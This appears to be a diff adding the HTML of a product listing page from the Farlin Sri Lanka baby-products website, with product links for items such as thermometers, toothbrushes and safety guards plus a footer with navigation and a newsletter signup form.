+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 172  safetypins">
+                        	<a href="http://farlin.lk/products/safety-pins-4/"><span><strong>Safety Pins</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-122A_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 172  safetypins">
+                        	<a href="http://farlin.lk/products/safety-pins-3/"><span><strong>Safety Pins</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-121-6_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 172  safetypins">
+                        	<a href="http://farlin.lk/products/safety-pins-2/"><span><strong>Safety Pins</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-121_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 172  safetypins">
+                        	<a href="http://farlin.lk/products/safety-pins/"><span><strong>Safety Pins</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-120_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  doorgate">
+                        	<a href="http://farlin.lk/products/door-gate/"><span><strong>Door Gate</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-932C_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  safetybedrail">
+                        	<a href="http://farlin.lk/products/safety-bed-rail/"><span><strong>Safety Bed Rail</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-931B_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  safetyfannet">
+                        	<a href="http://farlin.lk/products/safety-fan-net/"><span><strong>Safety Fan Net</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-515A.jpg"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  safetyguardfortable-edge">
+                        	<a href="http://farlin.lk/products/safety-guard-for-table-edge-bf-511/"><span><strong>Safety Guard For Table-Edge</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-511_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  safetyguardforsocket">
+                        	<a href="http://farlin.lk/products/safety-guard-for-socket-3/"><span><strong>Safety Guard For Socket</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-510D_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  safetyguardforsocket">
+                        	<a href="http://farlin.lk/products/safety-guard-for-socket-2/"><span><strong>Safety Guard For Socket</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-510C_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  safetyguardforsocket">
+                        	<a href="http://farlin.lk/products/safety-guard-for-socket/"><span><strong>Safety Guard For Socket</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-510_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  digitalfeverthermometer">
+                        	<a href="http://farlin.lk/products/digital-fever-thermometer-top-162a/"><span><strong>Digital Fever Thermometer</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/TOP-162A_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  360earpick20pcs">
+                        	<a href="http://farlin.lk/products/360-earpick-20pcs/"><span><strong>360 Earpick 20PCS</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/PER-113_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  flexibletipdigitalthermometer">
+                        	<a href="http://farlin.lk/products/flexible-tip-digital-thermometer-2/"><span><strong>Flexible Tip Digital Thermometer</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-169A_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  digitalfeverthermometer">
+                        	<a href="http://farlin.lk/products/digital-fever-thermometer/"><span><strong>Digital Fever Thermometer</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-162B_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  babysafetynailcutter">
+                        	<a href="http://farlin.lk/products/baby-safety-nail-cutter/"><span><strong>Baby Safety Nail Cutter</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-160E_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  nailclipper">
+                        	<a href="http://farlin.lk/products/nail-clipper/"><span><strong>Nail Clipper</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-160D_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  nailclipper">
+                        	<a href="http://farlin.lk/products/nail-clipper-bf-160c/"><span><strong>Nail Clipper</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-160C_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154  multi-purposesafetyscissors">
+                        	<a href="http://farlin.lk/products/multi-purpose-safety-scissors/"><span><strong>Multi-Purpose Safety Scissors</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-160A-1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  nosecleaningclip">
+                        	<a href="http://farlin.lk/products/nose-cleaning-clip/"><span><strong>Nose Cleaning Clip</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-115_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  adheringearcleanerforelderchild">
+                        	<a href="http://farlin.lk/products/adhering-ear-cleaner-for-elder-child/"><span><strong>Adhering Ear Cleaner For elder Child</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-113-5_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  adheringearcleanerfornewbornbaby">
+                        	<a href="http://farlin.lk/products/adhering-ear-cleaner-for-newborn-baby/"><span><strong>Adhering Ear Cleaner For newborn Baby</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-113-4_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  safetycottonbuds80pcs">
+                        	<a href="http://farlin.lk/products/safety-cotton-buds-80pcs/"><span><strong>Safety Cotton Buds 80PCS</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-113-3_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  cottonbuds100pcs">
+                        	<a href="http://farlin.lk/products/cotton-buds-100pcs/"><span><strong>Cotton Buds 100PCS</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-113_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 157  nasalaspirator">
+                        	<a href="http://farlin.lk/products/nasal-aspirator/"><span><strong>Nasal Aspirator</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-138_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 157  medifeeder">
+                        	<a href="http://farlin.lk/products/medifeeder/"><span><strong>MediFeeder</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-19104_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 157  medicinefeeder">
+                        	<a href="http://farlin.lk/products/medicine-feeder/"><span><strong>Medicine Feeder</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-19103_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 157  icepillow">
+                        	<a href="http://farlin.lk/products/ice-pillow/"><span><strong>Ice Pillow</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-163-1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 157  flexibletipdigitalthermometer">
+                        	<a href="http://farlin.lk/products/flexible-tip-digital-thermometer/"><span><strong>Flexible Tip Digital Thermometer</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-169A_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  safetydoor-stopper">
+                        	<a href="http://farlin.lk/products/safety-door-stopper-bf-513a/"><span><strong>Safety Door-Stopper</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-513A_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  safetydoor-stopper">
+                        	<a href="http://farlin.lk/products/safety-door-stopper/"><span><strong>Safety Door-Stopper</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-513_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  internethouseholdguardiancamera">
+                        	<a href="http://farlin.lk/products/internet-household-guardian-camera/"><span><strong>Internet Household Guardian Camera</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/FL301_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  internethouseholdguardiancamera2">
+                        	<a href="http://farlin.lk/products/internet-household-guardian-camera-2/"><span><strong>Internet Household Guardian Camera 2</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/FL501_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  digitalvideomonitor">
+                        	<a href="http://farlin.lk/products/digital-video-monitor-bf-152a/"><span><strong>Digital Video Monitor</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-152A_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 156  digitalaudiomonitor">
+                        	<a href="http://farlin.lk/products/digital-audio-monitor/"><span><strong>Digital Audio Monitor</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-152-1_0_product_main1.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 155  toothbrushtrainingsetof3stagebabyoralhygieneset">
+                        	<a href="http://farlin.lk/products/toothbrush-training-set-of-3-stage-baby-oral-hygiene-set/"><span><strong>Toothbrush Training Set Of 3 stage Baby Oral Hygiene Set</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-118D_3_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 155  tonguecleanerof3stagebabyoralhygieneset">
+                        	<a href="http://farlin.lk/products/tongue-cleaner-of-3-stage-baby-oral-hygiene-set/"><span><strong>Tongue Cleaner of 3 stage Baby Oral Hygiene Set</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-118-5_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 155  threestagestoothbrush">
+                        	<a href="http://farlin.lk/products/three-stages-toothbrush/"><span><strong>Three Stages Toothbrush</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-118A_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  secondstagetoothbrush">
+                        	<a href="http://farlin.lk/products/second-stage-toothbrush/"><span><strong>Second Stage Toothbrush</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-118-3_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 155  chewingtypetoothbrush">
+                        	<a href="http://farlin.lk/products/chewing-type-toothbrush/"><span><strong>Chewing Type Toothbrush</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-119_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 155  baby’sfirsttoothbrush">
+                        	<a href="http://farlin.lk/products/babys-first-toothbrush/"><span><strong>Baby’s First Toothbrush</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-117_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 155  babytoothbrush">
+                        	<a href="http://farlin.lk/products/baby-toothbrush/"><span><strong>Baby Toothbrush</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-118-4_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  safetyscissors">
+                        	<a href="http://farlin.lk/products/safety-scissors/"><span><strong>Safety Scissors</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-160B_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  safetyhaircutsetforchildren">
+                        	<a href="http://farlin.lk/products/safety-haircut-set-for-children/"><span><strong>Safety Haircut Set for Children</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-153_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  lightingearcleaner">
+                        	<a href="http://farlin.lk/products/lighting-ear-cleaner/"><span><strong>Lighting Ear Cleaner</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-114-1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  comb&#038;brushset">
+                        	<a href="http://farlin.lk/products/comb-brush-set/"><span><strong>Comb &#038; Brush Set</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-150A_3_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  baththermometer">
+                        	<a href="http://farlin.lk/products/bath-thermometer-2/"><span><strong>Bath Thermometer</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/01/BF-179A_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 155  3stagebabyoralhygieneset">
+                        	<a href="http://farlin.lk/products/3-stage-baby-oral-hygiene-set-bf-118c/"><span><strong>3 Stage Baby Oral Hygiene Set</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2012/12/BF-118C_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  baththermometer">
+                        	<a href="http://farlin.lk/products/bath-thermometer/"><span><strong>Bath Thermometer</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2012/12/BF-179_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  babycomb&#038;brushset">
+                        	<a href="http://farlin.lk/products/baby-comb-brush-set/"><span><strong>Baby Comb &#038; Brush Set</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2012/12/BF-150_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                       
+                    </ul>
+                  
+                  
+                   </div> 
+                   <script type="text/javascript">
+        $(function() {
+           /* $("#demo5").paginate({
+                count         : 56,
+                start         : 1,
+                display     : 7,
+                border                    : true,
+                border_color            : '#fff',
+                text_color              : '#fff',
+                background_color        : 'black',    
+                border_hover_color        : '#ccc',
+                text_hover_color          : '#000',
+                background_hover_color    : '#fff', 
+                images                    : false,
+                mouse                    : 'press',
+                onChange                 : function(page){
+                                            $('._current','#paginationdemo').removeClass('_current').hide();
+                                            $('#p'+page).addClass('_current').show();
+                                          }
+            }); */
+        });
+        </script>                
+                         
+                <div id="demo5"></div>  
+                  
+                </section>
+            </section>
+        </div><!--hero-->
+    </div><!--wrapper-->
+     </div>
+	
+<footer class="footer">
+	<div class="footer-mid">
+    	<div class="top-img"></div>
+        <div class="links">
+        	<div class="middle-cvr-pre-footer">
+    	<div class="ul-cvr">
+        <h2>Farlin Sri Lanka</h2>
+        	<ul>
+                <a href="http://farlin.lk/index.php"><li>Home</li></a>
+                <a href="http://farlin.lk//about"><li>About</li></a>
+                <a href="http://farlin.lk/customer-care"><li></li></a>
+                <a href="http://farlin.lk/where-to-buy"><li>Where to Buy</li></a>
+                <a href="http://farlin.lk/mothers-room"><li>Mother's Club</li></a>
+            </ul>
+        </div>
+        <div class="ul-cvr">
+        <h2>Products</h2>
+        	<ul>             
+                <a href="http://farlin.lk/products/age_range/feeding/"><li>Feeding</li></a>
+                <a href="http://farlin.lk/products/age_range/for-mom/"><li>For Mom</li></a>
+                <a href="http://farlin.lk/productcategories/furniture-bedding/"><li>Furniture & Bedding</li></a>
+                <a href="http://farlin.lk/productcategories/gifts/"><li>Gifts</li></a>
+                <a href="http://farlin.lk/products/age_range/grooming-hygiene/"><li>Grooming & Hygiene</li></a>            	
+            </ul>
+        </div>
+         <div class="ul-cvr">
+        <h2>Products</h2>
+        	<ul>
+            	 <a href="http://farlin.lk/productcategories/health-safety/"><li>Health & Safety</li></a>
+                <a href="http://farlin.lk/productcategories/outgoing"><li>Outgoing</li></a>
+                <a href="http://farlin.lk/productcategories/plaything-footwear/"><li>Plaything & Footwear</li></a>
+                <a href="http://farlin.lk/productcategories/weaning"><li>Weaning</li></a>
+                <a href="http://farlin.lk/"><li></li></a>
+            </ul>
+        </div>
+        <div class="ul-cvr">
+        <h2>Newsletter sign up</h2>
+        	<ul class="special">            	
+               <li><div class="signup-footer">
+                    <form id="footer_subcri" name="footer_subcri">                    
+                    <input type="hidden" class="signup"   name="nn" id="nn" /> 
+                    <input style="margin-bottom:0px;" class="news-letter" onblur="if (this.value=='') this.value=this.defaultValue" onclick="if (this.defaultValue==this.value) this.value=''" value="Your email" name="ne"> 
+                    <input type="hidden" class="signup"   name="np1" id="np1" />                     
+                    <input type="hidden" class="signup"  name="np2" id="np2"/>
+                    <input type="hidden" class="signup"   name="np3" id="np3" />                     
+                    <input type="hidden" class="signup"   name="np4" id="np4"/>                     
+                    <input type="hidden" class="signup"   name="np5" id="np5" /> 
+                    <input type="hidden" name="na" value="s"> 
+                    <input type="hidden" name="nr" value="plugin">
+                    <input type="submit" class="btn-legoclub"  value="Sign Up">
+                    </form>
+                </div></li> 
+            </ul>
+        </div>
+         <script type="text/javascript">  
+                    var frmvalidator  = new Validator("footer_subcri"); 
+                    frmvalidator.addValidation("ne","req","please enter email");  
+                    frmvalidator.addValidation("ne","email","please enter valid email");
+              </script>      
+        <div class="ul-cvr">
+        <h2>Follow Us</h2>
+        	<ul class="fb">
+            	<li><a href="https://www.facebook.com/Farlin.lk"><img src="http://farlin.lk/wp-content/themes/KTI-lego/img/images/FACEBOOK_70.png" /></a></li>
+                <li><a href="https://twitter.com/Farlin_LK"><img src="http://farlin.lk/wp-content/themes/KTI-lego/img/images/FACEBOOK_72.png" /></a></li>  
+
+               <!-- <div style="margin-left: 21px; float: right; margin-top: -3px;"><a href="http://www.bestweb.lk/vote/voteme.php?domain=www.lego.lk"><img width="78px" src="http://www.kti.lk/my-content/themes/rounder/design/img/voteme.png" alt="Vote For Us"></a></div> -->
+
+            </ul>
+        </div>
+		
+		<style type="text/css">
+
+                .links {
+                    position: relative;
+                }
+
+            </style>
+
+           <div class="final">
+           	<div class="cpy">&copy; 2004 - 2013 Farlin by  <a href="http://www.kti.lk" target="_blank">Kti Srilanka</a></div>
+            <div class="pyxle">Design &amp; concept by <a href="http://www.pyxle.net" target="_blank">pyxle</a></div>
+           </div>
+           </div>
+    </div>
+        </div>
+    </div>
+ 
+</footer>
+<script type="text/javascript">
+	$(document).ready(function(){
+
+		$('#scrollbar1').tinyscrollbar();
+
+	});
+</script>
+</body>
+</html>
